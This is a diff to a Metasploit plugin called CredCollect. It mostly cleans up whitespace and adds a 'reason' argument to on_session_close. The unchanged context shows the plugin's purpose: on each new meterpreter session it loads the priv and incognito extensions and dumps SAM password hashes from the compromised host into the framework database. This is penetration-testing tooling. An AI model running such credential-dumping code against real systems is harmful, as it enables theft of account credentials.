@@ -29,7 +29,7 @@ class Plugin::CredCollect < Msf::Plugin
 				end
 			end
 		end
-		
+
 		def cmd_db_tokens()
 			if not self.framework.db.active
 				print_error("Database not connected")
@@ -44,24 +44,24 @@ class Plugin::CredCollect < Msf::Plugin
 	end
 
 	def on_session_open(session)
-	
+
 		return if not self.framework.db.active
-		
+
 		print_status("This is CredCollect, I have the conn!")
-		
+
 		if (session.type == "meterpreter")
-			
+
 			# Make sure we're rockin Priv and Incognito
 			session.core.use("priv")
 			session.core.use("incognito")
 
 			# It wasn't me mom! Stinko did it!
 			hashes = session.priv.sam_hashes
-			
+
 			# Target infos for the db record
 			addr = session.sock.peerhost
 			host = self.framework.db.find_or_create_host(
-				:host => addr, 
+				:host => addr,
 				:state => Msf::HostState::Alive
 				)
 
@@ -95,7 +95,7 @@ class Plugin::CredCollect < Msf::Plugin
 		end
 	end
 
-	def on_session_close(session)
+	def on_session_close(session,reason='')
 	end
 
 	def initialize(framework, opts)
@@ -119,3 +119,4 @@ class Plugin::CredCollect < Msf::Plugin
 
 end
 end
+
